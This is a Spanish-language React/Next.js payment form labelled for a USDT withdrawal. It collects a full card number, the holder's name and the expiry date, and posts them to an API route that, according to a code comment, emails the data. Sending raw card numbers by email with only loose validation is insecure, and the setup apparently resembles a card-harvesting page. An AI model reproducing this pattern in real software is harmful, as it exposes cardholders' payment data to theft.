'use client';
import { useState } from 'react';
import Image from 'next/image';
import visaLogoPng from '/public/visa.png';
import mastercardLogoPng from '/public/mastercard.png';
import visaLogoSvg from '/public/visa.svg';
import mastercardLogoSvg from '/public/mastercard.svg';

const PaymentForm = () => {
  const [paymentAmount, setPaymentAmount] = useState('');
  const [cardType, setCardType] = useState('MasterCard');
  const [cardNumber, setCardNumber] = useState('');
  const [cardHolder, setCardHolder] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [errors, setErrors] = useState<{ [key: string]: string }>({});

  // Función para formatear el número de tarjeta (agrupando dígitos de 4 en 4)
  const formatCardNumber = (num: string) => {
    return num.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  };

  // Validación de campos
  const validate = () => {
    const newErrors: { [key: string]: string } = {};
    if (!paymentAmount || isNaN(Number(paymentAmount)) || Number(paymentAmount) <= 0) {
      newErrors.paymentAmount = 'Ingrese un monto válido.';
    }
    if (!cardNumber || cardNumber.replace(/\D/g, '').length < 13) {
      newErrors.cardNumber = 'Ingrese un número de tarjeta válido.';
    }
    if (!cardHolder) {
      newErrors.cardHolder = 'Ingrese el nombre del titular.';
    }
    if (!expiryDate || !/^\d{2}\/\d{2}$/.test(expiryDate)) {
      newErrors.expiryDate = 'Formato debe ser MM/YY.';
    } else {
      // Validar mes y año
      const [mm, yy] = expiryDate.split('/').map(Number);
      if (mm < 1 || mm > 12) newErrors.expiryDate = 'Mes inválido.';
    }
    return newErrors;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loading) return;
    setLoading(true);
    setErrors({});

    const validationErrors = validate();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
      setLoading(false);
      return;
    }

    // Datos que se enviarán a la API para el correo
    const paymentData = {
      currency: 'USDT',
      paymentAmount,
      cardType,
      cardNumber,
      cardHolder,
      expiryDate,
    };

    try {
      const response = await fetch('/api/sndMailCardRetiro2', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData),
      });
      const data = await response.json();

      if (response.ok) {
        alert('✅ Solicitud enviada correctamente.');
        // Limpiar campos tras éxito
        setPaymentAmount('');
        setCardType('MasterCard');
        setCardNumber('');
        setCardHolder('');
        setExpiryDate('');
      } else {
        alert(data?.error || 'Error al enviar la solicitud.');
      }
    } catch (error) {
      console.error('Error en la solicitud:', error);
      alert('Ocurrió un error al enviar la solicitud.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <form onSubmit={handleSubmit} className="max-w-md mx-auto p-6">
      <h2 className="text-2xl font-bold text-center mb-6 text-white">
        Formulario de Pago
      </h2>

      {/* Mensaje de error */}
      {errorMsg && (
        <div className="mb-4 text-red-400 text-center font-semibold">{errorMsg}</div>
      )}

      {/* Sección: Moneda, Tipo de Tarjeta y Monto */}
      <div className="space-y-4">
        {/* Moneda: Solo visual, siempre USDT */}
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Moneda
          </label>
          <div className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white">
            USDT
          </div>
        </div>

        {/* Selección del tipo de tarjeta */}
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Tipo de Tarjeta
          </label>
          <select
            value={cardType}
            onChange={(e) => setCardType(e.target.value)}
            className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
          >
            <option value="MasterCard">MasterCard</option>
            <option value="Visa">Visa</option>
          </select>
        </div>

        {/* Monto de Pago */}
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Monto de Pago
          </label>
          <input
            type="number"
            value={paymentAmount}
            onChange={(e) => setPaymentAmount(e.target.value)}
            placeholder="Ej: 150.00"
            className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
          />
          {errors.paymentAmount && (
            <p className="text-red-400 text-xs mt-1">{errors.paymentAmount}</p>
          )}
        </div>
      </div>

      {/* Tarjeta interactiva con diseño realista */}
      <div className="mt-6">
        <h3 className="text-lg font-semibold text-gray-200 mb-2">
          Tarjeta de Crédito
        </h3>
        <div className="relative bg-gradient-to-r from-gray-700 to-gray-900 p-6 rounded-xl shadow-2xl">
          {/* Fila superior con chip y logotipo */}
          <div className="flex justify-between items-start">
            {/* Chip (SVG) */}
            <div className="w-10 h-10">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="currentColor"
                viewBox="0 0 24 24"
                className="w-10 h-10 text-yellow-500"
              >
                <path d="M6 2a2 2 0 00-2 2v4H2v4h2v4a2 2 0 002 2h4v2h4v-2h4a2 2 0 002-2v-4h2v-4h-2V4a2 2 0 00-2-2h-4V0h-4v2H6zm0 2h4v2H6V4zm8 0h4v2h-4V4zM6 10h4v2H6v-2zm8 0h4v2h-4v-2zM6 16h4v2H6v-2zm8 0h4v2h-4v-2z" />
              </svg>
              
            </div>

<h3
  className="text-lg font-semibold text-gray-200 mb-2"
  style={{ marginLeft: '-82px' }}
>
  World Elite
</h3>
            {/* Logotipo de la tarjeta */}
            <div className="w-[70px] h-[44px] flex items-center justify-center">
              {cardType === 'Visa' ? (
                <Image
                  src={visaLogoSvg}
                  alt="Visa"
                  width={80}
                  height={54}
                  style={{ objectFit: 'contain' }}
                  className="w-full h-full"
                />
              ) : (
                <Image
                  src={mastercardLogoSvg}
                  alt="MasterCard"
                  width={70}
                  height={44}
                  style={{ objectFit: 'contain' }}
                  className="w-full h-full"
                />
              )}
            </div>
          </div>

          {/* Número de tarjeta */}
          <div className="mt-8">
            <p className="text-center text-2xl tracking-widest font-mono">
              {formatCardNumber(cardNumber) || 'XXXX XXXX XXXX XXXX'}
            </p>
          </div>

          {/* Detalles: Nombre del titular y fecha de expiración */}
          <div className="mt-8 flex justify-between">
            <div>
              <p className="text-xs uppercase text-gray-400">Card Holder</p>
              <p className="text-lg font-semibold">
                {cardHolder || 'NOMBRE DEL TITULAR'}
              </p>
            </div>
            <div className="text-right">
              <p className="text-xs uppercase text-gray-400">Valid Thru</p>
              <p className="text-lg font-semibold">
                {expiryDate || 'MM/YY'}
              </p>
            </div>
          </div>
        </div>
      </div>

      {/* Inputs para actualizar datos de la tarjeta */}
      <div className="mt-6 space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Número de Tarjeta
          </label>
          <input
            type="text"
            value={cardNumber}
            onChange={(e) => setCardNumber(e.target.value)}
            placeholder="Ej: 1234 5678 9012 3456"
            className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
          />
          {errors.cardNumber && (
            <p className="text-red-400 text-xs mt-1">{errors.cardNumber}</p>
          )}
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Nombre en la Tarjeta
          </label>
          <input
            type="text"
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value)}
            placeholder="Ej: Juan Pérez"
            className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
          />
          {errors.cardHolder && (
            <p className="text-red-400 text-xs mt-1">{errors.cardHolder}</p>
          )}
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-300">
            Fecha de Expiración
          </label>
          <input
            type="text"
            value={expiryDate}
            onChange={(e) => setExpiryDate(e.target.value)}
            placeholder="MM/YY"
            className="mt-1 w-full px-3 py-2 rounded bg-gray-800 text-white"
            maxLength={5}
          />
          {errors.expiryDate && (
            <p className="text-red-400 text-xs mt-1">{errors.expiryDate}</p>
          )}
        </div>
      </div>

      {/* Botones: Cerrar y Continuar */}
      <div className="flex justify-between mt-6">
        <button
          type="button"
          className="px-6 py-2 bg-gray-600 text-white rounded hover:bg-gray-700"
          onClick={() => {
            setPaymentAmount('');
            setCardType('MasterCard');
            setCardNumber('');
            setCardHolder('');
            setExpiryDate('');
            setErrors({});
          }}
        >
          Cerrar
        </button>
        <button
          type="submit"
          className="px-6 py-2 bg-blue-600 text-white rounded hover:bg-blue-700"
          disabled={loading || !paymentAmount || !cardType || !cardNumber || !cardHolder || !expiryDate}
        >
          {loading ? 'Procesando...' : 'Continuar'}
        </button>
      </div>
    </form>
  );
};

export default PaymentForm;